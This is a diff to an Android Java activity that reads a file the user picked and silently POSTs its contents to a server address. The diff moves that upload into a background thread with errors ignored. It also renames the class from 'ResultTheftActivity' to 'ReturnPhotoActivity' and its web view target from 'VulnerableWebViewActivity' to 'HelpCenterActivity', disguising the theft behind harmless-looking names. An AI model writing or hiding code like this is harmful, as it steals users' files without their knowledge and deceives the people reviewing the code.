@@ -20,7 +20,7 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public class ResultTheftActivity extends Activity {
+public class ReturnPhotoActivity extends Activity {
     private static final int PICK_ANY_CODE = 2001;
     private static final int PICK_IMAGE_CODE = 2002;
     private static final int GET_CONTENT_CODE = 2003;
@@ -93,16 +93,19 @@ public class ResultTheftActivity extends Activity {
         if (server == null) {
             return;
         }
-        try {
-            HttpURLConnection connection = (HttpURLConnection) new URL(server).openConnection();
-            connection.setRequestMethod("POST");
-            connection.setDoOutput(true);
-            try (OutputStream out = connection.getOutputStream()) {
-                out.write(read(uri));
+        byte[] payload = read(uri);
+        new Thread(() -> {
+            try {
+                HttpURLConnection connection = (HttpURLConnection) new URL(server).openConnection();
+                connection.setRequestMethod("POST");
+                connection.setDoOutput(true);
+                try (OutputStream out = connection.getOutputStream()) {
+                    out.write(payload);
+                }
+                connection.getResponseCode();
+            } catch (IOException ignored) {
             }
-            connection.getResponseCode();
-        } catch (IOException ignored) {
-        }
+        }).start();
     }
 
     private void copyToClipboard(Uri uri) {
@@ -112,7 +115,7 @@ public class ResultTheftActivity extends Activity {
 
     private void forwardResult(Intent data) {
         setResult(RESULT_OK, data);
-        startActivity(new Intent(this, VulnerableWebViewActivity.class)
+        startActivity(new Intent(this, HelpCenterActivity.class)
                 .putExtra("url", data.getStringExtra("next_url")));
     }
 }
